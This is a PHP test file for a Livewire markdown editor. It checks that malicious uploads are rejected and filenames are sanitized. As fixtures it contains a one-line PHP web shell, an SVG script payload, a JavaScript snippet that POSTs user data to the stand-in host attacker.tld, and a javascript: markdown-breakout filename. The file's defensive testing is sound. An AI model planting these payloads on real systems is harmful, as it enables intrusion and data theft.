<?php

declare(strict_types=1);

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Livewire\Livewire;
use Mckenziearts\LivewireMarkdownEditor\Livewire\MarkdownEditor;

uses(Tests\TestCase::class);

beforeEach(function (): void {
    config()->set('livewire-markdown-editor.disk', 'media');
    config()->set('livewire-markdown-editor.upload.max_size', 2048);
    config()->set('livewire-markdown-editor.upload.allowed_extensions', ['jpg', 'jpeg', 'png', 'gif', 'webp', 'avif']);
    config()->set('livewire-markdown-editor.upload.images_only', true);

    Storage::fake('media');
});

it('rejects html upload disguised as attachment', function (): void {
    $file = UploadedFile::fake()->createWithContent(
        'phishing.html',
        '<html><body><form>steal-creds</form></body></html>',
    );

    Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasErrors(['attachments.0']);

    expect(Storage::disk('media')->allFiles())->toBeEmpty();
});

it('rejects svg upload containing inline script', function (): void {
    $file = UploadedFile::fake()->createWithContent(
        'payload.svg',
        '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    );

    Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasErrors(['attachments.0']);

    expect(Storage::disk('media')->allFiles())->toBeEmpty();
});

it('rejects javascript file even with valid extension', function (): void {
    $file = UploadedFile::fake()->createWithContent(
        'evil.js',
        'fetch("/api/user").then(r => r.json()).then(d => fetch("https://attacker.tld", {method:"POST", body:JSON.stringify(d)}));',
    );

    Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasErrors(['attachments.0']);

    expect(Storage::disk('media')->allFiles())->toBeEmpty();
});

it('rejects php file upload', function (): void {
    $file = UploadedFile::fake()->createWithContent(
        'shell.php',
        '<?php echo shell_exec($_GET["cmd"]); ?>',
    );

    Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasErrors(['attachments.0']);

    expect(Storage::disk('media')->allFiles())->toBeEmpty();
});

it('rejects files above configured max size', function (): void {
    $file = UploadedFile::fake()->image('huge.jpg')->size(3000);

    Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasErrors(['attachments.0']);
});

it('accepts a valid png upload and stores with random filename', function (): void {
    $file = UploadedFile::fake()->image('cover.png', 640, 480);

    Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasNoErrors();

    $files = Storage::disk('media')->allFiles();
    expect($files)->toHaveCount(1)
        ->and($files[0])->toMatch('/^[A-Za-z0-9]{40}\.png$/');
});

it('accepts valid jpg and injects image markdown with sanitized alt', function (): void {
    $file = UploadedFile::fake()->image('my-great-photo.jpg', 640, 480);

    $component = Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasNoErrors();

    expect($component->get('content'))
        ->toContain('![')
        ->toContain('.jpg)')
        ->not->toContain('<script>')
        ->not->toContain('javascript:');
});

it('sanitizes markdown breakout characters from client filename', function (): void {
    $file = UploadedFile::fake()->image('evil](javascript:alert(1))!.png');

    $component = Livewire::test(MarkdownEditor::class)
        ->set('attachments', [$file])
        ->assertHasNoErrors();

    $content = (string) $component->get('content');

    expect($content)
        ->not->toContain('](javascript:')
        ->not->toContain('](https')
        ->toMatch('/!\[[^\[\]()<>"\'\\\\]*\]\([^)]+\)/');
});
